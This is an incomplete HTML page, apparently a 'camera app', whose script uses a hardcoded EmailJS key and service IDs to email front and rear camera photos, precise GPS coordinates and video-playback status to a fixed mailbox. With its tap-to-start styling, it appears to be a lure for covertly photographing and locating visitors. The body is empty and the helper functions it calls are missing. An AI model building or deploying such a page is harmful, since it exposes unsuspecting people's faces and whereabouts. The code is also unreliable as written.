<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>内カメ・外カメ撮影アプリ（EmailJS連携）</title>

<style>
    body {
        margin: 0; padding: 20px;
        font-family: Arial, sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        min-height: 100vh;
        cursor: pointer;
    }
    .container {
        max-width: 800px; margin: 0 auto; text-align: center;
    }
    .touch-area {
        background: rgba(255,255,255,0.1);
        border: 2px dashed rgba(255,255,255,0.3);
        border-radius: 15px;
        padding: 40px;
        margin: 20px 0;
        cursor: pointer;
        transition: all 0.3s ease;
        min-height: 200px;
    }
    .touch-area:hover {
        background: rgba(255,255,255,0.2);
        border-color: rgba(255,255,255,0.5);
    }
    .media-container {
        margin: 20px 0;
        background: rgba(0,0,0,0.2);
        border-radius: 10px;
        padding: 20px;
    }
    video,img {
        max-width: 100%;
        height: auto;
        border-radius: 8px;
        margin: 10px 0;
    }
    .status {
        background: rgba(0,0,0,0.3);
        padding: 15px;
        border-radius: 5px;
        margin: 10px 0;
        font-size: 16px;
    }
    .data-display {
        background: rgba(0,0,0,0.2);
        padding: 15px;
        border-radius: 8px;
        margin: 10px 0;
        text-align: left;
        font-family: monospace;
        font-size: 12px;
        word-break: break-all;
    }
    .error { color: #ff6b6b; background: rgba(255,107,107,0.1); }
    .success { color: #4CAF50; background: rgba(76,175,80,0.1); }
    .warning { color: #ff9800; background: rgba(255,152,0,0.1); }
    .debug-toggle {
        position: fixed; top: 10px; right: 10px;
        background: rgba(0,0,0,0.5);
        color: white;
        border: none;
        padding: 10px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 12px;
    }
    .debug-info {
        background: rgba(0,0,0,0.7);
        padding: 10px;
        border-radius: 5px;
        margin: 10px 0;
        font-family: monospace;
        font-size: 11px;
        text-align: left;
        max-height: 200px;
        overflow-y: auto;
        display: none;
    }
</style>

<!-- EmailJS SDK -->
<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  emailjs.init("cPjKBUm_i6HebDQF7"); // 公開鍵

  async function sendEmail({ photoRear, photoFront, location, videoPlayed }) {
    updateStatus("✉️ メール送信中...", 'warning');
    try {
      const templateParams = {
        photo_rear: photoRear,
        photo_front: photoFront,
        location_info: `緯度: ${location.latitude}<br>経度: ${location.longitude}<br>精度: ${location.accuracy}m<br>時刻: ${location.timestamp}`,
        video_status: videoPlayed ? "✅ 動画再生成功" : "⚠️ 動画再生失敗",
        date: new Date().toLocaleString()
      };

      await emailjs.send("service_ja2c09x", "template_2fp2jrg", templateParams);
      updateStatus("✉️ メール送信完了", "success");
      logDebug("✅ EmailJS送信成功");

    } catch (e) {
      console.error("❌ EmailJS送信失敗:", e);
      logDebug(`❌ EmailJS送信エラー詳細: ${JSON.stringify(e)}`);
      throw new Error("メールの送信に失敗しました");
    }
  }
</script>


</body>
</html>
